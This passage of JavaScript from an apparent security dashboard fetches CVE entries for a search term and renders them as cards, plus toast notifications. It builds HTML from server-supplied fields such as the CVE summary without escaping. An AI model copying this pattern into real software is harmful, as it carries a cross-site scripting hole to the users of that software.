                    body: JSON.stringify({ query: queryStr || 'Nginx' })
                });
                const data = await resp.json();
                if (data && data.cves && data.cves.length > 0) {
                    feedContainer.innerHTML = '';
                    data.cves.forEach(item => {
                        const card = document.createElement('div');
                        card.className = 'feed-item';
                        const isHigh = item.severity === 'HIGH' || item.severity === 'CRITICAL' || (parseFloat(item.score) >= 7.0);
                        const severityClass = isHigh ? 'high' : 'med';
                        const icon = isHigh ? 'fa-solid fa-radiation' : 'fa-solid fa-triangle-exclamation';

                        card.innerHTML = `
                            <div class="feed-badge-icon ${severityClass}">
                                <i class="${icon}"></i>
                            </div>
                            <div class="feed-body">
                                <div class="feed-meta">
                                    <span class="feed-id">${item.cveId}</span>
                                    <span class="feed-time">Published: ${item.published || 'Recent'}</span>
                                    <span class="badge ${isHigh ? 'badge-danger' : 'badge-warning'}" style="margin-left:8px;">CVSS ${item.score}</span>
                                </div>
                                <div class="feed-title">${item.cveId} - Vulnerability Notice</div>
                                <div class="feed-desc">${item.summary}</div>
                            </div>
                        `;
                        feedContainer.appendChild(card);
                    });
                } else {
                    feedContainer.innerHTML = '<div class="matrix-empty text-muted"><i class="fa-solid fa-circle-info"></i> No matching CVE entries found for search query.</div>';
                }
            } catch (e) {
                console.error('CVE fetch error:', e);
                feedContainer.innerHTML = '<div class="matrix-empty text-muted"><i class="fa-solid fa-circle-exclamation"></i> Threat intel database sync unavailable.</div>';
            }
        };

        if (searchBtn && searchInput) {
            searchBtn.addEventListener('click', () => {
                const q = searchInput.value.trim();
                if (q) executeCveSearch(q);
            });
            searchInput.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    const q = searchInput.value.trim();
                    if (q) executeCveSearch(q);
                }
            });
        }

        // Load initial default feed query
        executeCveSearch('Nginx');
    },

    // Helper: Toast Notifications
    showToast: function (title, desc) {
        const toast = document.getElementById('toast-notif');
        if (!toast) return;

        toast.querySelector('.toast-title').innerText = title;
        toast.querySelector('.toast-desc').innerText = desc;
        toast.classList.remove('d-none');

        // Auto hide after 4 seconds
        setTimeout(() => {
            toast.classList.add('d-none');
        }, 4000);
    }
};

// Start application when DOM compiles
document.addEventListener('DOMContentLoaded', () => {
    app.init();
});
